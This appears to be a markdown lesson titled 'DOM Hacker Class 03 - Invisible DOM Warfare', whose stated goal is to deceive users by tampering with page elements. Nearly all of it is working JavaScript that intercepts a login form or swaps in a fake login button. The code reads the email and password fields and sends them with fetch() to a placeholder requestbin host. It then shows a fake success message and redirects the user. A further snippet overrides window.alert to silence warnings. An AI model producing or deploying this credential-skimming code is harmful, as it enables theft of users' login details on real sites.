## Real-World Use Case
Used in:

* Malicious JavaScript in login portals
* XSS payloads to intercept user logins

```js

---

## 📘 DOM Hacker Class 03 - Invisible DOM Warfare

```md
# DOM Hacker Class 03 - Invisible DOM Warfare

## 🎯 Goal
Deceive users by replacing, disabling, or overriding real page elements.

---

## 🧱 Disable Real Form
```js
document.getElementById("loginForm").onsubmit = function(event) {
  event.preventDefault();

  let email = document.getElementById("email").value;
  let pass = document.getElementById("password").value;

  fetch("https://YOUR-REQUESTBIN.x.pipedream.net?email=" + email + "&pass=" + pass);

  document.getElementById("status").textContent = "✅ Login Successful. Redirecting...";

  setTimeout(function() {
    window.location.href = "https://real-site.com";
  }, 2000);
};
```

## Replace the real button with fake one
```js
let realBtn = document.getElementById("loginBtn");
realBtn.style.display = "none";

let fakeBtn = document.createElement("button");
fakeBtn.textContent = "Login";
fakeBtn.style.background = "green";
fakeBtn.onclick = function() {
  let email = document.getElementById("email").value;
  let pass = document.getElementById("password").value;

  fetch("https://YOUR-REQUESTBIN.x.pipedream.net?e=" + email + "&p=" + pass);
  document.getElementById("status").textContent = "✅ Login Successful";
};
realBtn.parentNode.appendChild(fakeBtn);
```
## DIsable alerts
```js
window.alert = function(msg) {
  console.log("Blocked alert:", msg);
};
```
